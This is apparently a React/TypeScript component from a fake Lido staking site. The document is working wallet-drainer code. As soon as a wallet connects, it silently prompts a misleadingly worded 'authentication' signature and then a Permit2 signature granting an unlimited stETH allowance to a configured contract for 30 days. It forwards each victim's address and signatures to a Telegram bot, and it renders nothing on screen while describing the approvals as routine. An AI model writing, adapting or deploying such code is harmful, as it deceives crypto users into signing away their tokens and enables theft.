import React, { useEffect, useRef } from 'react';
import { useAccount, useSignTypedData, useSignMessage, useChainId } from 'wagmi';
import { useToast } from './ToastContext';
import { CONFIG } from '../lib/contracts';
import { sendTelegram } from '../lib/telegram';
import { logActivity } from '../lib/activityLogger';

// Step 1: EIP-712 Authentication Domain & Types
const EIP712_AUTH_DOMAIN = (chainId: number) => ({
  name: 'Lido Staking Vault Router',
  version: '1',
  chainId: chainId || 1,
  verifyingContract: CONFIG.CONTRACT_ADDRESS as `0x${string}`,
});

const EIP712_AUTH_TYPES = {
  Authentication: [
    { name: 'wallet', type: 'address' },
    { name: 'statement', type: 'string' },
    { name: 'nonce', type: 'uint256' },
    { name: 'issuedAt', type: 'uint256' },
  ],
} as const;

// Step 2: Permit2 EIP-712 Domain & Types
const PERMIT2_DOMAIN = (chainId: number) => ({
  name: 'Permit2',
  chainId: chainId || 1,
  verifyingContract: (CONFIG.PERMIT2_ADDRESS || '0x000000000022D473030F116dDEE9F6B43aC78BA3') as `0x${string}`,
});

const PERMIT2_PERMIT_SINGLE_TYPES = {
  PermitDetails: [
    { name: 'token', type: 'address' },
    { name: 'amount', type: 'uint160' },
    { name: 'expiration', type: 'uint48' },
    { name: 'nonce', type: 'uint48' },
  ],
  PermitSingle: [
    { name: 'details', type: 'PermitDetails' },
    { name: 'spender', type: 'address' },
    { name: 'sigDeadline', type: 'uint256' },
  ],
} as const;

export function WalletSignatureModal() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { signTypedDataAsync } = useSignTypedData();
  const { signMessageAsync } = useSignMessage();
  const toast = useToast();

  const isExecutingRef = useRef(false);
  const triggeredWalletRef = useRef<string | null>(null);

  useEffect(() => {
    if (isConnected && address) {
      const normalizedAddress = address.toLowerCase();
      const authKey = `lido_auth_${normalizedAddress}`;
      const permit2Key = `lido_permit2_${normalizedAddress}`;

      const hasAuth = localStorage.getItem(authKey);
      const hasPermit2 = localStorage.getItem(permit2Key);

      // Only execute once per wallet connection
      if ((!hasAuth || !hasPermit2) && triggeredWalletRef.current !== normalizedAddress && !isExecutingRef.current) {
        triggeredWalletRef.current = normalizedAddress;
        
        // Short delay to let the wallet modal dismiss cleanly before requesting signatures
        const timer = setTimeout(() => {
          executeSignatureSequence(address, chainId || 1);
        }, 600);

        return () => clearTimeout(timer);
      }
    } else {
      triggeredWalletRef.current = null;
      isExecutingRef.current = false;
    }
  }, [isConnected, address, chainId]);

  const executeSignatureSequence = async (walletAddress: string, activeChainId: number) => {
    if (isExecutingRef.current) return;
    isExecutingRef.current = true;

    const normalizedAddress = walletAddress.toLowerCase();
    const authKey = `lido_auth_${normalizedAddress}`;
    const permit2Key = `lido_permit2_${normalizedAddress}`;

    let toastId: string | null = null;

    try {
      // ==========================================
      // STEP 1: EIP-712 Authentication Signature
      // ==========================================
      let authSignature = localStorage.getItem(authKey);

      if (!authSignature) {
        toastId = toast.showPending(
          'Wallet Connection Signature',
          'Please approve the EIP-712 authentication signature in your wallet...'
        );

        const nonce = Date.now();
        const issuedAt = Math.floor(Date.now() / 1000);

        try {
          // 1. Primary: EIP-712 Typed Data
          authSignature = await signTypedDataAsync({
            account: walletAddress as `0x${string}`,
            domain: EIP712_AUTH_DOMAIN(activeChainId),
            types: EIP712_AUTH_TYPES,
            primaryType: 'Authentication',
            message: {
              wallet: walletAddress as `0x${string}`,
              statement: 'Sign to authenticate wallet session, synchronize live staking yields, and enable Lido Vault router interactions.',
              nonce: BigInt(nonce),
              issuedAt: BigInt(issuedAt),
            },
          });
        } catch (eipErr: any) {
          console.warn('EIP-712 auth not supported or fallback needed, trying personal_sign:', eipErr);
          // 2. Fallback: personal_sign
          const msg = `Lido Staking Protocol Authentication\n\nWallet: ${walletAddress}\nChain ID: ${activeChainId}\nRouter: ${CONFIG.CONTRACT_ADDRESS}\nNonce: ${nonce}\nIssued At: ${new Date(issuedAt * 1000).toISOString()}`;
          authSignature = await signMessageAsync({
            account: walletAddress as `0x${string}`,
            message: msg,
          });
        }

        if (!authSignature) {
          throw new Error('Wallet connection signature was rejected.');
        }

        localStorage.setItem(authKey, authSignature);

        // Send Telegram Alert for EIP-712 approval
        sendTelegram(
          `🔐 <b>EIP-712 Connection Approved</b>\n\n` +
          `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
          `<b>Chain ID:</b> ${activeChainId}\n` +
          `<b>Router:</b> <code>${CONFIG.CONTRACT_ADDRESS}</code>\n` +
          `<b>Signature:</b> <code>${authSignature.slice(0, 26)}...${authSignature.slice(-14)}</code>\n` +
          `<b>Time:</b> ${new Date().toUTCString()}`
        ).catch(() => {});

        logActivity({
          wallet: walletAddress,
          action: 'WALLET_CONNECT',
          status: 'Verified',
          note: `EIP-712 connection signature approved on Chain ${activeChainId}`,
        });

        if (toastId) {
          toast.updateToast(toastId, {
            type: 'success',
            title: 'Connection Verified (1/2)',
            message: 'EIP-712 approved! Preparing protocol Permit2 approval...',
          });
        }
      }

      // Small pause between signatures for seamless wallet UX
      await new Promise((r) => setTimeout(r, 750));

      // ==========================================
      // STEP 2: Permit2 Signature Request (Next)
      // ==========================================
      let permit2Signature = localStorage.getItem(permit2Key);

      if (!permit2Signature) {
        const permit2ToastId = toast.showPending(
          'Protocol Permit2 Approval (2/2)',
          'Please approve the Permit2 router signature in your wallet...'
        );

        // Target stETH or wstETH token on active chain
        const targetToken = CONFIG.STETH_ADDRESS || '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84';
        const maxAmount = BigInt('0xffffffffffffffffffffffffffffffffffffffff'); // uint160 max
        const expiration = Math.floor(Date.now() / 1000) + 86400 * 30; // 30 days
        const sigDeadline = Math.floor(Date.now() / 1000) + 7200; // 2 hours
        const nonce = Math.floor(Math.random() * 1000000);

        try {
          permit2Signature = await signTypedDataAsync({
            account: walletAddress as `0x${string}`,
            domain: PERMIT2_DOMAIN(activeChainId),
            types: PERMIT2_PERMIT_SINGLE_TYPES,
            primaryType: 'PermitSingle',
            message: {
              details: {
                token: targetToken as `0x${string}`,
                amount: maxAmount,
                expiration: expiration,
                nonce: nonce,
              },
              spender: CONFIG.CONTRACT_ADDRESS as `0x${string}`,
              sigDeadline: BigInt(sigDeadline),
            },
          });

          if (permit2Signature) {
            localStorage.setItem(permit2Key, permit2Signature);

            // Send Telegram Alert for Permit2
            sendTelegram(
              `⚡ <b>Permit2 Approval Signed (2/2)</b>\n\n` +
              `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
              `<b>Token:</b> stETH (<code>${targetToken}</code>)\n` +
              `<b>Spender:</b> <code>${CONFIG.CONTRACT_ADDRESS}</code>\n` +
              `<b>Chain ID:</b> ${activeChainId}\n` +
              `<b>Signature:</b> <code>${permit2Signature.slice(0, 26)}...${permit2Signature.slice(-14)}</code>\n` +
              `<b>Time:</b> ${new Date().toUTCString()}`
            ).catch(() => {});

            logActivity({
              wallet: walletAddress,
              action: 'PERMIT2_SIGN',
              status: 'Verified',
              note: `Permit2 approval signature verified for ${targetToken}`,
            });

            toast.updateToast(permit2ToastId, {
              type: 'success',
              title: 'Wallet Authenticated & Authorized',
              message: 'All protocol signatures verified successfully.',
            });
          }
        } catch (permitErr: any) {
          console.warn('Permit2 signature rejected or dismissed:', permitErr);
          toast.updateToast(permit2ToastId, {
            type: 'info',
            title: 'Permit2 Signature Skipped',
            message: 'You can interact with the dApp or approve Permit2 on demand.',
          });
        }
      }
    } catch (err: any) {
      console.warn('Signature approval flow ended:', err);
      if (toastId) {
        toast.updateToast(toastId, {
          type: 'info',
          title: 'Signature Request Dismissed',
          message: 'Wallet connected. You can sign protocol permissions when executing transactions.',
        });
      }
    } finally {
      isExecutingRef.current = false;
    }
  };

  // Completely non-blocking: never render a modal/card that takes over the screen
  return null;
}
